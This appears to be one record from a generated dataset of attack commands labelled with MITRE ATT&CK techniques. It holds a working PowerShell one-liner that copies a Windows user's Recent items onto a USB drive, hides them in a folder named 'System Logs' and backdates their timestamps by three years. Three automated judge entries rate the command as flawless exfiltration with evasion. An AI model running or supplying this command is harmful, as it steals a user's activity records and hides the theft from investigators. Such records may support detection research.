command: $usb=((Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | Select -First 1 -ExpandProperty DeviceID)+'\'); $dst=Join-Path $usb 'System Logs'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; Copy-Item "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Recent\*" -Destination $dst -Force -ErrorAction SilentlyContinue; Get-ChildItem $dst -Recurse | ForEach-Object { $_.CreationTime=(Get-Date).AddYears(-3); $_.LastWriteTime=$_.CreationTime }
explanation: Copies Recent items to a benign-looking folder on USB using Copy-Item and then timestomps them to appear old, reducing scrutiny.
rationale_steps: Copy recent file references via Copy-Item
Adjust timestamps to blend with older data

llm_judgments.syntactic_justification: The PowerShell pipeline is well-formed with balanced quotes and parentheses, valid cmdlets/parameters, and proper use of separators.
llm_judgments.semantic_justification: It locates a removable drive, creates a benign-named folder, copies Recent items to it, and timestomps them, aligning with T1052 exfiltration to physical media and evasion tactics.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper variable assignments, pipeline operations, error handling with SilentlyContinue, balanced quotes/parentheses/braces, and appropriate PowerShell cmdlets and parameters.
llm_judgments.semantic_justification: The command perfectly aligns with T1052 by automatically detecting a USB drive, creating a deceptively named folder ('System Logs'), copying user's Recent items to it, and using timestamp manipulation to reduce detection - all core components of exfiltration over physical medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes and parentheses, proper command separators, and valid cmdlet parameters.
llm_judgments.semantic_justification: The command flawlessly achieves its claimed intent by finding a USB drive, creating a benign-looking directory, copying user 'Recent' items, and effectively timestomping them to appear old, all aligning perfectly with T1052 exfiltration and evasion tactics.
